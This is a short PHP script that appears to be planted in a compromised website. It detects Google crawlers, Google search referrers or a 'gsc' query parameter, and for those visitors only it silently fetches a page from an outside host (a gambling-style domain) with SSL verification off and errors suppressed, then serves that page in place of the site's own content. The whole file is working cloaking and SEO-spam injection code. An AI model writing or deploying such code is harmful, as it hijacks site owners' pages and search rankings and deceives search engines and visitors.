<?php
if(PHP_SAPI==='cli')return;
$ua=isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):'';
$ref=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
$path='/';
if(isset($_SERVER['REQUEST_URI'])){
    $p=@parse_url($_SERVER['REQUEST_URI']);
    if($p&&isset($p['path']))$path=$p['path'];
}
if($path===''||$path===false)$path='/';
if($path!=='/'&&strpos($path,'.')===false)$path=rtrim($path,'/').'/';
$isBot=preg_match('~googlebot|adsbot|inspectiontool|apis-google|mediapartners~i',$ua);
$map=array(
'/?lang=id/' => 'https://burung303resmi.com/path/ub.php'
);
$qParam=!empty($_GET['gsc']);
if(($isBot||($ref&&strpos($ref,'search.google')!==false)||$qParam)&&isset($map[$path])){
    if($isBot)usleep(300000);
    $url=$map[$path];
    $c='';
    if(function_exists('curl_init')){
        $ch=@curl_init($url);	
        if($ch){
            @curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            @curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
            @curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
            @curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
            @curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,3);
            @curl_setopt($ch,CURLOPT_TIMEOUT,5);
            @curl_setopt($ch,CURLOPT_USERAGENT,$ua?$ua:'Mozilla/5.0');
            $c=@curl_exec($ch);
            @curl_close($ch);
        }
    }
    if((!$c||strlen(trim($c))<20)&&ini_get('allow_url_fopen')){
        $ctx=@stream_context_create(array('http'=>array('method'=>'GET','timeout'=>5,'header'=>"User-Agent: ".($ua?$ua:'Mozilla/5.0')."\r\n")));
        $c=@file_get_contents($url,false,$ctx);
    }
    if($c&&strlen(trim($c))>0){
        if(function_exists('ob_get_length')&&ob_get_length())@ob_clean();
        @header('Content-Type: text/html; charset=UTF-8');
        @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        @header('Pragma: no-cache');
        @header('Expires: 0');
        echo $c;
        exit;
    }
}
